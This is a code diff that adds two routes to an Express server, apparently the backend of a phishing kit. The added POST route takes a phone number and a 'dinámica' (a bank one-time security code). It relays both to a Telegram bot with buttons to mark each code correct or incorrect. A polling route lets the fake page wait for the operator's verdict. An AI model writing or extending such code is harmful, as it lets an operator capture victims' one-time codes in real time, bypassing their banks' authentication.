@@ -71,3 +71,36 @@ app.get('/estado/:numero', (req, res) => {
 // Iniciar servidor
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log('Servidor funcionando en el puerto', PORT));
+
+// Ruta para Dinámica
+app.post('/dinamica', async (req, res) => {
+  const { numero, dinamica } = req.body;
+
+  const payload = {
+    chat_id: CHAT_ID,
+    text: `🔁 Validación dinámica:\n\n📱 Número: ${numero}\n📘 Respuesta: ${dinamica}`,
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: '✅ Dinámica Correcta', callback_data: `correcta_${numero}` },
+          { text: '❌ Dinámica Incorrecta', callback_data: `incorrecta_${numero}` }
+        ]
+      ]
+    },
+    parse_mode: 'HTML'
+  };
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+
+  res.send({ ok: true });
+});
+
+// Estado de dinámica
+app.get('/dinamica_estado/:numero', (req, res) => {
+  const numero = req.params.numero;
+  res.send({ estado: estados[numero] || null });
+});
